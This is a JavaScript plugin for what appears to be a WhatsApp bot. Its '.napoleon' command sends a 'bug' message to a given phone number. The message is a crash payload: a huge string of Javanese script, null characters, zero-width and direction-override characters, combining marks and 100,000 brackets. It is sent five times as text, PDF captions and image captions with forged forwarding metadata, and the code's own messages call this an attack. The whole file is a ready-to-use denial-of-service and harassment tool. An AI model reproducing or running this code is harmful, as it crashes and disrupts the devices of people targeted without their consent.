/**
 * PLUGIN: NAPOLEON BUG (Optimized RAM)
 * Usage: .napoleon <nomor>
 */

import fs from 'fs'
import path from 'path'

const pluginConfig = {
    name: 'napoleon',
    alias: ['np', 'nted'],
    category: 'owner',
    description: '💀 Napoleon Bug Sender (Optimized)',
    usage: '.napoleon <nomor>',
    example: '.napoleon 628xxxxxxxx',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 60,
    energi: 10,
    isEnabled: true
}

async function ZXCBOS(sock, Jid) {
    const d = (ms) => new Promise(r => setTimeout(r, ms));

    const stikerPath = path.resolve("./media/stiker.webp");
    const pdfPath = path.resolve("./media/Assalamu'alaikum.pdf");
    const imgPath = path.resolve("./media/sw.jpg");

    const stikerBuffer = fs.existsSync(stikerPath) ? fs.readFileSync(stikerPath) : null;
    const pdfBuffer = fs.existsSync(pdfPath) ? fs.readFileSync(pdfPath) : null;
    const imgBuffer = fs.existsSync(imgPath) ? fs.readFileSync(imgPath) : null;

    const virtex =
        "ꦾꦿ꧀ꦱꦺꦴꦭꦸTꦶꦎꦤ꧀ꦏꦿ꧀ꦲꦺꦴꦮ꦳ꦺꦂꦮ꧀ꦭ꧀ꦝ꧀ꦠ꧀ꦤ꧀ꦥ꧀ꦧ꧀ꦩ꧀ꦪ꧀ꦫ꧀ꦭ꧀ꦮ꧀ꦱ꧀ꦲ꧀" +
        "ꦀꦁꦂꦃꦄꦅꦆꦇꦈꦉꦊꦋꦌꦍꦎꦏꦐꦑꦒꦓꦔꦕꦖꦗꦘꦙꦚꦛꦜꦝꦞꦟ" +
        "ꦴꦵꦶꦷꦸꦹꦺꦻꦼꦽꦾꦿ꧀꧁꧂꧃꧄꧅꧆꧇꧈꧉꧊꧋꧌꧍";

    // ─── OPTIMASI: KURANGI UKURAN PAYLOAD (Dari 400k jadi 100k) ───
    const payload = virtex.repeat(1000) + // Dari 4000 jadi 1000
        "\u0000".repeat(20000) +
        "\u200B\u200C\u200D\u2060\uFEFF".repeat(2000) +
        "\u200E\u202E\u200F\u202A\u202B\u202C\u202D".repeat(1000) +
        "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C".repeat(500) +
        "[".repeat(100000); // Dari 400000 jadi 100000

    // ─── OPTIMASI: LOOP CUMA 5X ───
    const maxLoops = 5; 

    for (let i = 0; i < maxLoops; i++) {
        try {
            const mode = i % 4;

            if (mode === 0) {
                await sock.relayMessage(Jid, {
                    extendedTextMessage: {
                        text: payload,
                        matchedText: "\u0000",
                        font: 6,
                        previewType: 0,
                        contextInfo: {
                            forwardingScore: 9999,
                            isForwarded: true,
                            expiration: 604800,
                            ephemeralExpiration: 604800
                        }
                    }
                }, {
                    noSelfSync: true,
                    messageId: "3EB0" + Date.now().toString(16).toUpperCase() + i.toString(16).padStart(8, "0")
                });

                if (stikerBuffer) {
                    try { await sock.sendMessage(Jid, { sticker: stikerBuffer }); } catch {}
                }
            } else if (mode === 1 && pdfBuffer) {
                await sock.sendMessage(Jid, {
                    document: pdfBuffer,
                    mimetype: "application/pdf",
                    fileName: "ZXCBOS_" + i + ".pdf",
                    caption: payload
                });
            } else if (mode === 2 && imgBuffer) {
                await sock.sendMessage(Jid, {
                    image: imgBuffer,
                    caption: payload
                });
            } else {
                await sock.sendMessage(Jid, { text: payload });
            }

            await d(3000); // Jeda 3 detik biar server gak drop

        } catch (e) {
            await d(3000);
        }
    }
}

async function handler(m, { sock }) {
    try {
        const args = m.args || []
        const prefix = m.prefix || '.'
        const rawNumber = args[0]?.trim()

        if (!rawNumber) return m.reply(`Example : ${prefix}napoleon 62xxx`)

        let pepec = rawNumber.replace(/[^0-9]/g, "")
        let target = pepec + '@s.whatsapp.net'

        await m.reply(`*_⏳ Prosess Attack To ${pepec}⚡, Please Wait..._*`)
        
        ZXCBOS(sock, target).then(() => {
            sock.sendMessage(m.chat, { react: { text: "☠️", key: m.key } })
        }).catch(console.error)

        return m.reply('✅ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝙏𝙤 𝘽𝙪𝙜')

    } catch (error) {
        console.error('[napoleon]', error.message)
    }
}

export { pluginConfig as config, handler }